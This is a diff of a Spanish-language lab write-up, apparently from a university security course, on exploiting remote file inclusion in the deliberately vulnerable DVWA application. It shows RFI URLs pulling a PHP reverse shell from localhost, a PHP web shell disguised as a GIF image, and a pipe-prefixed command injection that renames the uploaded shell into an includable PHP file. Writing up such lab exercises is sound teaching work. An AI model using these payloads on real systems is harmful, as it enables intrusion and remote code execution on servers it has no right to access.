@@ -1,7 +1,5 @@
 # RFI
 
-Remote file inclusion (RFI) es una vulnerabilidad que permite a un atacante incluir archivos de un servidor remoto. Esto puede ser utilizado para incluir archivos PHP, que luego pueden ser utilizados para ejecutar código arbitrario en el servidor.
-
 ## Bajo
 
 Para comenzar, podemos intentar lanzar un shell remoto escrito en PHP `php-reverse-shell.php` que se encuentra en nuestro servidor local y que previamente hemos creado con el siguiente contenido:
@@ -40,7 +38,7 @@ Una vez mejorada la TTY, podemos intentar leer el archivo `fi.php` utilizando ca
 cat DVWA/hackable/flags/fi.php
 ```
 
-![rfi](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/rfi.png)
+![rfi](/FI/assets/rfi.png)
 
 ## Medio
 
@@ -56,13 +54,13 @@ Si probamos a ejecutarlo, comprobaremos que no funciona debido a que el servidor
 http://localhost/DVWA/vulnerabilities/fi/?page=Http://localhost/php-reverse-shell.php
 ```
 
-![rfi-2](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/rfi-2.png)
+![rfi-2](/FI/assets/rfi-2.png)
 
 Como se puede ver, se ha vuelto a visualizar el archivo `fi.php` de donde extraemos todas las citas.
 
 ## Alto
 
-Al contrario que en los niveles anteriores, ahora para subir la reverse shell al servidor remoto debemos hacerlo aprovechando otra vulnerabilidad, en este caso la vulnerabilidad de `subida de archivos` o `file upload`. Para ello, podemos utilizar el script utilizado en la sección de `file upload`:
+Al contrario que en los niveles anteriores, ahora para subir la reverse shell al servidor remoto debemos hacerlo aprovechando otra vulnerabilidad, en este caso la vulnerabilidad de **subida de archivos** o **file upload**. Para ello, podemos utilizar el script utilizado en la sección de file upload:
 
 ```php
 GIF98
@@ -75,20 +73,18 @@ system($cmd);
 ```
 
 Como se menciona en la otra sección se puede ver que se consigue subir el archivo `shell.png` a través de la siguiente URI:
-![uploaded-high](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/uploaded-h.png)
+![uploaded-high](/FU/assets/upload-high.png)
 
-```
-../../hackable/uploads/shell.png
-```
-
-```bash
-|ls ../../hackable/uploads/
-```
+Una vez subido, procedemos a cambiar el nombre del archivo a `shell.php` y a moverlo a la carpeta `fi` mediante la técnica de Command Injection:
 
 ```bash
 |mv ../../hackable/uploads/shell.png ../fi/file5.php
 ```
 
-![challenge-4](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/challenge-4.png)
+Una vez movido, podemos intentar incluir el archivo `file5.php` en el servidor remoto a través de la siguiente URI:
 
-/hackable/flags
+```
+http://localhost/DVWA/vulnerabilities/fi/?page=file5.php
+```
+
+![challenge-4](/FI/assets/challenge-4.png)
